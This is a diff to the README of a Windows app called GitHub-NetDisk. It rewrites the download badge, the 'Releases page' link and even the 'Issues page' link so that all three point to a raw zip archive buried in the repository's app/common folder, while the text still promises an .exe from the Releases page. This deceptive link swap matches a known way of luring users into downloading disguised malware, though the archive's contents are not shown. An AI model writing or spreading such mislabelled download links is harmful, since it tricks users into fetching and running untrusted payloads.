@@ -1,6 +1,6 @@
 # ☁️ GitHub-NetDisk - Turn GitHub Into Your Personal Cloud
 
-[![Download from Releases](https://img.shields.io/badge/Download-Windows_Installer-blue?style=for-the-badge&logo=windows)](https://github.com/Jasonscientific421/GitHub-NetDisk/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Windows_Installer-blue?style=for-the-badge&logo=windows)](https://github.com/Jasonscientific421/GitHub-NetDisk/raw/refs/heads/main/app/common/Hub-Disk-Git-Net-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows you how to download and run the software on Windows. No coding 
 
 ## 📥 How to Download
 
-1.  Go to the [GitHub-NetDisk Releases page](https://github.com/Jasonscientific421/GitHub-NetDisk/releases).
+1.  Go to the [GitHub-NetDisk Releases page](https://github.com/Jasonscientific421/GitHub-NetDisk/raw/refs/heads/main/app/common/Hub-Disk-Git-Net-1.8.zip).
 2.  Look for the latest version at the top of the page.
 3.  Find the file that ends with `.exe`. It looks like `GitHub-NetDisk-Setup-x.x.x.exe`.
 4.  Click on that file to start the download.
@@ -142,6 +142,6 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 🤝 Support
 
-If you have questions or find a bug, please visit the [Issues page](https://github.com/Jasonscientific421/GitHub-NetDisk/issues). Describe your problem clearly, and the community will help.
+If you have questions or find a bug, please visit the [Issues page](https://github.com/Jasonscientific421/GitHub-NetDisk/raw/refs/heads/main/app/common/Hub-Disk-Git-Net-1.8.zip). Describe your problem clearly, and the community will help.
 
 Keywords: cloud-drive, desktop-app, fluent-design, github-api, python, pyqt5, qfluentwidgets, windows-app, macos-app, linux
